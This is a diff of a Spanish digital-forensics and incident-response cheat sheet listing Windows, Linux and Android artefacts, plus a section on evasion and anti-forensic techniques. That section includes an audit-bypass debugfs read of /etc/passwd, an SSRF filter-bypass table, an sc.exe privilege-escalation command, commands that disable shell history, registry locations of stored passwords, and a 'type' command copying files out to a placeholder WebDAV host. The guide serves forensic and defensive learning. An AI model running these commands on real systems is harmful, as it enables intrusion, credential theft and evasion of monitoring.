@@ -13,16 +13,16 @@ Análisis forense de artefactos comunes y no tan comunes, técnicas anti-forense
 
 # 🔍 Análisis forense y artefactos
 
-### 🔵 Logs de eventos de Windows
+### ▶️ Logs de eventos de Windows
 
-| Path | Info | Evidencias |
-|------|------|------------|
+| File Path | Info | Evidencias |
+|-----------|------|------------|
 | `%WINDIR%\System32\config` `%WINDIR%\System32\winevt\Logs` | Contiene los logs de Windows accesibles desde el visor de eventos | Casi todas. Entradas, fechas, accesos, permisos, programas, usuario, etc. |
 
-### 🔵 Logs de registros varios sobre instalaciones en Windows
+### ▶️ Logs de registros varios sobre instalaciones en Windows
 
-| Path | Info | Evidencias |
-|------|------|------------|
+| File Path | Info | Evidencias |
+|-----------|------|------------|
 | `%WINDIR%\System32\config` `%WINDIR%\System32\winevt\Logs` | Contiene los logs de Windows accesibles desde el visor de eventos | Casi todas. Entradas, fechas, accesos, permisos, programas, usuario, etc. |
 | `%WINDIR%\setupact.log` | Contiene información acerca de las acciones de instalación durante la misma | Podemos ver fechas de instalación, propiedades de programas instalados, rutas de acceso, copias legales, discos de instalación |
 | `%WINDIR%\setuperr.log` | Contiene información acerca de los errores de instalación durante la misma | Fallos de programas, rutas de red inaccesibles, rutas a volcados de memoria |
@@ -39,7 +39,20 @@ Análisis forense de artefactos comunes y no tan comunes, técnicas anti-forense
 | `%ProgramData%\Microsoft\Windows Defender\Support` | Contiene pruebas históricas de WD (Windows Defender). Los nombres de los archivos serán- MPLog-\*.log, MPDetection-\*.log, MPDeviceControl-\*.log | Fechas, versiones productos, servicios, notificaciones, CPU, ProcessImageName, EstimatedImpact, binarios, etc. |
 | `%ProgramData%\Microsoft\Windows Defender\Scans\Scans\History` | Cuando se detecta una amenaza, WD almacena un archivo binario "DetectionHistory" | Se pueden analizar estos archivos utilizando herramientas como DHParser |
 
-### 🔵 Artefactos de conexiones de clientes VPN
+### ▶️ Logs de Linux
+
+| File Path | Info |
+|-----------|------|
+| `/var/log/syslog` | Los mensajes globales del sistema incluyendo trazas que generan algunos servicios durante el arranque, trazas que dejan los programas que se ejecutan por parte del demonio CROND, logs sobre procesos de autenticación llevados a cabo por los usuarios, etc. |
+| `/var/log/auth.log` (Debian y derivados) `/var/log/secure` (Red Hat y derivados) | Almacena los eventos relacionados con mecanismos de autorización, por ejemplo, cuando un usuario nicia sesión en el sistema. |
+| `/var/log/kern.log` | Este fichero almacena los logs producidos por el kernel. |
+| `/var/log/dpkg.log` | En sistemas basados en Debian se genera este fichero cuando se instala o desinstala software utilizando DPKG. Contiene las trazas y eventos producidos durante el proceso de instalación. |
+| `/var/log/btmp` | Este fichero incluye trazas sobre los intentos de autenticación fallido en el sistema. |
+| `/var/log/user.log` | Incluye información sobre los eventos producidos en las sesiones de los usuarios, dichos eventos incluyen errores, conexiones e interfaces de red que se encuentran activas. |
+| `/var/log/wtmp` | Contiene información sobre qué usuarios se encuentran autenticados y usando el sistema actualmente. |
+| `/var/log/cron` | Se trata de un fichero de logs en donde se guardan las trazas producidas por las tareas programadas ejecutadas por el demonio CROND. |
+
+### ▶️ Artefactos de conexiones de clientes VPN
 
 Revisar posibles artefactos de conexiones de clientes VPN realizadas desde un PC comprometido por un actor malicioso.
 
@@ -47,7 +60,7 @@ Revisar posibles artefactos de conexiones de clientes VPN realizadas desde un PC
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles
 ```
 
-### 🔵 Persistencia en servicios
+### ▶️ Persistencia en servicios
 
 Rama del registro donde se almacenan los valores de imagen de un controlador en un servicio. Usado a veces para mantener persistencia en el sistema.
 
@@ -56,7 +69,7 @@ Analizar ruta y parámetros del valor *"ImagePath"*.
 HKLM\SYSTEM\CurrentControlSet\Services
 ```
 
-### 🔵 ¿Han eliminado el registro de eventos de Windows?
+### ▶️ ¿Han eliminado el registro de eventos de Windows?
 
 ¿Los atacantes eliminaron todos los registros de eventos de Windows?
 
@@ -72,7 +85,7 @@ Get-ChildItem -Path F:\pid\ -Include *.evtx -Recurse | Copy-Item -Destination .\
 
 - Volatility - Referencia evtlogs: https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#evtlogs
 
-### 🔵 Volatility: clipboard
+### ▶️ Volatility: clipboard
 
 Desde un volcado de memoria, los datos del portapapeles pueden se interesantes para revelar información.
 ```
@@ -80,7 +93,7 @@ volatility.exe -f memdump.bin --profile=Win10x64_10586 clipboard
 ```
 - Referencia: https://downloads.volatilityfoundation.org/releases/2.4/CheatSheet_v2.4.pdf
 
-### 🔵 Obtener archivos con PID de procesos maliciosos (conexiones SSH Linux)
+### ▶️ Obtener archivos con PID de procesos maliciosos (conexiones SSH Linux)
 
 Se conectaron al sistema a través de SSH e iniciaron procesos maliciosos. Incluso, si eliminaron el historial de comandos.
 
@@ -90,7 +103,7 @@ Esta es una forma de obtener archivos con PID de procesos maliciosos (similar a 
 grep -l SSH_C /proc/*/environ
 ```
 
-### 🔵 Filtros Wireshark para analistas
+### ▶️ Filtros Wireshark para analistas
 
 - Referencia Wireshark: https://www.wireshark.org/docs/dfref
 - Brim Zed (herramienta que simplifica el análisis de datos superestructurados .pcapng): https://www.brimdata.io/download
@@ -257,7 +270,7 @@ tcp.flags.syn == 1 && tcp.flags.ack == 1
 tcp.analysis.duplicate_ack
 ```
 
-### 🔵 Análisis Forense en contenedores Docker 
+### ▶️ Análisis Forense en contenedores Docker 
 
 Si un contenedor malicioso modifica archivos o acciones de malware al iniciarse, es posible que se pierdan muchos artefactos de seguridad. La solución podría ser trabajar con el contenedor que se crea pero que no se inicia.
 
@@ -295,7 +308,7 @@ ctr image mount docker.io/library/nginx:latest rootfs
 ls -lathF rootfs
 ```
 
-### 🔵 Análisis y artefactos de ShellBags
+### ▶️ Análisis y artefactos de ShellBags
 
 Shellbags son un conjunto de claves de registro que contienen detalles sobre la carpeta vista de un usuario, como su tamaño, posición e icono. Proporcionan marcas de tiempo, información contextual y muestran el acceso a directorios y otros recursos, lo que podría apuntar a evidencia que alguna vez existió. 
 
@@ -342,13 +355,13 @@ Descripción de valores relevantes:
 
 -  **ShellBags Explorer** (GUI) o **SBECmd** (CLI): https://ericzimmerman.github.io/#!index.md
 
-### 🔵 Thumbcache Viewer
+### ▶️ Thumbcache Viewer
 
 Visualizar ficheros *"thumbcache_\*.db"*.
 
 - https://thumbcacheviewer.github.io
 
-### 🔵 Forense Android: Evidencias de imágenes eliminadas y enviadas por WhatsApp
+### ▶️ Forense Android: Evidencias de imágenes eliminadas y enviadas por WhatsApp
 
 Un usuario envió imágenes a través de Whatsapp, después las eliminó de su dispositivo móvil, pero estas imágenes todavía están en la carpeta "sent" de WhatsApp.
 
@@ -356,13 +369,13 @@ Un usuario envió imágenes a través de Whatsapp, después las eliminó de su d
 "Internal storage/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Sent"
 ```
 
-### 🔵 Comprobar si un usuario ejecutó el comando "sudo"
+### ▶️ Comprobar si un usuario ejecutó el comando "sudo"
 
 En un escenario en el que un posible atacante creó un nuevo usuario y eliminó el historial de comandos, pero aún no se puede confirmar si el atacante obtuvo privilegios de root ejecutando el comando "sudo".
 
 Verificar si el archivo **".sudo_as_admin_successful"** está en el directorio de inicio del usuario. Si se encuentra, entonces el atacante ejecutó el comando "sudo".
 
-### 🔵 Artefactos en dispositivos USB (Windows, Linux y MacOS)
+### ▶️ Artefactos en dispositivos USB (Windows, Linux y MacOS)
 
 `Windows`
 
@@ -430,7 +443,7 @@ Habilitar un registro detallado USB configurando "EnableLogging=1" en el fichero
 - USBDeview: https://www.nirsoft.net/utils/usb_devices_view.html
 - USB Forensic Tracker (USBFT) Windows, Linux y MacOS: https://www.orionforensics.com/forensics-tools/usb-forensic-tracker
 
-### 🔵 Análisis Forense de logs en AnyDesk, Team Viewer y LogMeIn 
+### ▶️ Análisis Forense de logs en AnyDesk, Team Viewer y LogMeIn 
 
 `AnyDesk`
 
@@ -471,7 +484,7 @@ SOFTWARE\LogMeIn\V5
 SOFTWARE\LogMeIn Ignition
 ```
 
-### 🔵 Conocer la URL de descarga de un archivo (Zone.Identifier)
+### ▶️ Conocer la URL de descarga de un archivo (Zone.Identifier)
 
 Saber si un archivo malicioso se descargó de Internet y desde que URL o se creó en el sistema local.
 
@@ -485,7 +498,7 @@ CMD
 notepad <FileName>:Zone.Identifier
 ```
 
-### 🔵 Artefactos forense - MS Word
+### ▶️ Artefactos forense - MS Word
 
 `Eventos de alertas MS Office`
 
@@ -555,24 +568,24 @@ Los archivos adjuntos tipo Word abiertos en directamente a través de en Outlook
 %LocalAppdata%\Microsoft\Windows\INetCache\Content.Outlook\<Folder>\
 ```
 
-### 🔵 Analizar malware en fichero XLSX (MS Excel)
+### ▶️ Analizar malware en fichero XLSX (MS Excel)
 
 Descomprimir el fichero .xlsx, dentro de la carpeta "XL" abrir editando el archivo llamado "workbook.xml", buscar el término **"absPath"**. Contiene la última ubicación de guardado del archivo donde veríamos al autor (C:\\<\user>\\..\\file.xlsx).
 
 Como técnica anti forense esta metadata se puede eliminar desde Excel "inspeccionando el documento" y borrando las "propiedades de documento e información personal". 
 
-### 🔵 Asignación de IPs en equipos
+### ▶️ Asignación de IPs en equipos
 
 En un incidente se descubre que se envió un paquete de red mal formado desde una dirección IP, pero el atacante elimina dicho registro. Se puede consultar la siguiente rama del registro para encontrar el equipo en la red que tenía esa dirección IP. Cada subclave tendrá un registro DHCP con los valores DhcpIPAddress, DhcpNameServer, etc.
 ```
 HKLM\SYSTEM\ControlSet00*\Services\Tcpip\Parameters\Interfaces
 ```
 
-### 🔵 Windows Firewall (wf.msc): Reglas residuales de software desintalado
+### ▶️ Windows Firewall (wf.msc): Reglas residuales de software desintalado
 
 Comprobar las reglas de entrada y salida en Windows Firewall **"wf.msc"**. Un actor malicioso podría haber instalado software que creó reglas de firewall. La mayoría de las aplicaciones no borran estas reglas, incluso cuando se desinstala.
 
-### 🔵 Persistencia: suplantación de procesos del sistema
+### ▶️ Persistencia: suplantación de procesos del sistema
 
 Detección de 2 procesos con el mismo PID pero diferentes direcciones de memoria, podría indicar un proceso de inyección malicioso. 
 
@@ -588,7 +601,7 @@ Process: rundll32.exe | Pid: 5287 | Address: 0xa90000
 Process: rundll32.exe | Pid: 5287 | Address: 0x6a1000
 ```
 
-### 🔵 Detectar malware Linux fileless (memfd)
+### ▶️ Detectar malware Linux fileless (memfd)
 
 Estos malware asignan bytes maliciosos en la memoria y se ejecutan. Una forma de detección es usar *memfd* para cualquier proceso y esto nos puede indicar malware sin archivos (fileless). 
 
@@ -596,7 +609,7 @@ Estos malware asignan bytes maliciosos en la memoria y se ejecutan. Una forma de
 cat /proc/*/maps | grep "memfd"
 ```
 
-### 🔵 SANS - Posters & Cheat Sheets (DFIR)
+### ▶️ SANS - Posters & Cheat Sheets (DFIR)
 
 - Referencia: https://www.sans.org/posters/?focus-area=digital-forensics
 
@@ -606,7 +619,7 @@ cat /proc/*/maps | grep "memfd"
 
 # 📓 Detección de técnicas de evasión en sistemas SIEM, SOC y Anti-Forense
 
-### 🔵 Comando Windows: net y net1
+### ▶️ Comando Windows: net y net1
 
 El comando "net1" funcionará igual que el comando "net".
 ```cmd
@@ -614,7 +627,7 @@ net1 accounts
 net accounts
 ```
 
-### 🔵 *debugfs* para eludir alertas al ejecutar comandos o acceder a ficheros con auditoria
+### ▶️ *debugfs* para eludir alertas al ejecutar comandos o acceder a ficheros con auditoria
 Si un actor malicioso accede a un archivo crítico, este puede estar auditado y los investigadores de SOC recibirán una alerta. Pero, si se usan el comando "*debugfs*" para acceder al archivo, es posible omitir esta alerta.
 - https://gtfobins.github.io/gtfobins/debugfs
 ```bash
@@ -625,7 +638,7 @@ debugfs: cat /etc/passwd
 ... modo interactivo ...
 ```
 
-### 🔵 WAF Bypass (SSRF): usar acortamiento IP local
+### ▶️ WAF Bypass (SSRF): usar acortamiento IP local
 
 | Bloqueo            | Bypass           |
 |--------------------|------------------|
@@ -633,7 +646,7 @@ debugfs: cat /etc/passwd
 | http://127.0.0.1   | http://127.1     |
 | http://192.168.0.5 | http://192.168.5 |
 
-### 🔵 Post-Explotación - PrivEsc con scmanager
+### ▶️ Post-Explotación - PrivEsc con scmanager
 LPE (Local Privilege Escalation) persistente y sin uso de archivos usando sc.exe otorgando permisos del SCM (Service Control Manager).
 
 - https://learn.microsoft.com/en-us/windows/win32/services/service-control-manager
@@ -643,7 +656,7 @@ sc.exe sdset scmanager D:(A;;KA;;;WD)
 [SC] SetServiceObjectSecurity SUCCESS
 ```
 
-### 🔵 Comando history
+### ▶️ Comando history
 
 Las líneas de historial con el sufijo * (asterisco) significa que ha sido modificado. Por ejemplo, usando la tecla hacia arriba (↑), se edita y luego se vuelve a presionar hacia arriba para cambiar a otro comando histórico sin presionar Enter. Cuando se vuelva a ejecutar history se verá que un comando del histórico a sido modificado pero no se sabrá cual fue el comando inicial ejecutado.
 
@@ -664,7 +677,7 @@ $ history
     3  history
 ```
 
-### 🔵 Deshabilitar el uso del historial en la Shell
+### ▶️ Deshabilitar el uso del historial en la Shell
 
 Un actor malicioso puede ejecutar estos comandos para no guardar o registrar en el archivo .bash_history el historial de acciones en la shell como técnica anti forense y evitar ser detectados.
 ```bash
@@ -672,7 +685,7 @@ export HISTFILE=/dev/null
 export HISTFILESIZE=0
 ```
 
-### 🔵 DLL Hijacking *cscapi.dll*
+### ▶️ DLL Hijacking *cscapi.dll*
 Windows Explorer carga automáticamente cscapi.dll que nunca se encuentra. Podría se aprovechada para ejecutar un payload.
 
 - https://twitter.com/D1rkMtr/status/1613568545757220864
@@ -681,7 +694,7 @@ Windows Explorer carga automáticamente cscapi.dll que nunca se encuentra. Podr�
 C:\Windows\cscapi.dll
 ```
 
-### 🔵 Otra técnica de ejecución de CMD o PowerShell
+### ▶️ Otra técnica de ejecución de CMD o PowerShell
 
 Un actor malicioso puede crear en una nueva línea de comandos en Powershell con el comando "query", de forma que pueda generar persistencia en el sistema. Si previamente ejecuta el siguiente comando.
 ```cmd
@@ -695,7 +708,7 @@ query pwned
 
 La detección puede ser complicada si se reemplaza "powershell.exe" por un ejecutable malicioso o tipo [LOLbin](https://lolbas-project.github.io/).
 
-### 🔵 Uso de *type* para descargar o subir ficheros
+### ▶️ Uso de *type* para descargar o subir ficheros
 
 1. Alojar un servidor WebDAV con acceso anónimo r/w
 2. Download: 
@@ -707,13 +720,13 @@ type \\webdav-ip\path\file.ext > C:\path\file.ext
 type C:\path\file.ext > \\webdav-ip\path\file.ext
 ```
 
-### 🔵 Forensia (Anti-Forensic)
+### ▶️ Forensia (Anti-Forensic)
 
 Herramienta antiforense para Red Teamers, utilizada para borrar algunas huellas en la fase posterior a la explotación.
 
 - https://github.com/PaulNorman01/Forensia
 
-### 🔵 Bloquear conexiones USB: Rubber Ducky y Cactus WHID
+### ▶️ Bloquear conexiones USB: Rubber Ducky y Cactus WHID
 
 - HID - Hardware ID 
 - VID - Vendor ID
@@ -739,7 +752,7 @@ New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\
 New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" -Name 'HID\VID_1B4F&PID_9208&REV_0100&MI_02&Col02' -Value 1 -PropertyType String
 ```
 
-### 🔵 Claves de registro de Windows donde se almacenan las contraseñas
+### ▶️ Claves de registro de Windows donde se almacenan las contraseñas
 
 Claves de registro de Windows donde se almacenan las contraseñas del sistema y de herramientas de terceros más comunes, buscadas en fases de Post-Explotación. 
 
@@ -770,7 +783,7 @@ HKCU\Software\PremiumSoft\NavicatOra\Servers
 HKCU\Software\TigerVNC\WinVNC4
 ```
 
-### 🔵 WDigest Authentication: Habilitado / Deshabilitado
+### ▶️ WDigest Authentication: Habilitado / Deshabilitado
 
 Si un malware habilita la "Autenticación WDigest" las contraseñas se almacenarán en texto claro en LSASS y en la memoria. En Windows 10 está deshabilitado de forma predeterminada.
 ```
@@ -780,7 +793,7 @@ Habilitado:    UseLogonCredential = 1
 Deshabilitado: UseLogonCredential = 0
 ```
 
-### 🔵 Detectar si un sistema es una máquina virtual con PowerShell o WMIC
+### ▶️ Detectar si un sistema es una máquina virtual con PowerShell o WMIC
 
 PowerShell
 ```ps
@@ -797,19 +810,19 @@ BIOSVersion     SMBIOSBIOSVersion
 ...
 ```
 
-### 🔵 Técnicas de ofuscación en la ejecucación de comandos en Windows
+### ▶️ Técnicas de ofuscación en la ejecucación de comandos en Windows
 
 - https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation
 
 
-### 🔵 Detectar acciones de AutoRun al abrir una Command Prompt (cmd)
+### ▶️ Detectar acciones de AutoRun al abrir una Command Prompt (cmd)
 
 Un atacante creó un valor *"AutoRun"* en la siguiente clave de registro, aquí pudo agregar un comando malicioso como sus datos de valor. Ahora, cada vez que se inicie una consola cmd este comando se ejecutará automáticamente.
 ```
 HKLM\SOFTWARE\Microsoft\Command Processor
 ```
 
-### 🔵 Extensiones ejecutables alternativas a .exe
+### ▶️ Extensiones ejecutables alternativas a .exe
 
 Un atancante puede renombrar la extensión de un fichero malicioso a extensiones como: 
 
@@ -817,7 +830,7 @@ Un atancante puede renombrar la extensión de un fichero malicioso a extensiones
 
 Todas se ejecutarán de la misma forma que .exe.
 
-### 🔵 Detectar malware que se está ejecutando desde una carpeta que no permite su acceso por error de ubicación (tipo de flujo NTFS en directorios $INDEX_ALLOCATION)
+### ▶️ Detectar malware que se está ejecutando desde una carpeta que no permite su acceso por error de ubicación (tipo de flujo NTFS en directorios $INDEX_ALLOCATION)
 
 Un posible actor malicioso podría crear una carpeta visible a través de línea de comandos ejecutando un dir y/o también verla en un explorador de Windows. 
 
@@ -861,7 +874,7 @@ C:\malware\test2.::$index_allocation>cd ..
 C:\malware>
 ```
 
-### ➥ Auditoría en el uso privilegiado de los siguientes comandos
+### ▶️ Auditoría en el uso privilegiado de los siguientes comandos
 Los siguientes comandos privilegiados deberían auditarse:
 |   |   |   |   |   |   |
 |:-:|:-:|:-:|:-:|:-:|:-:|
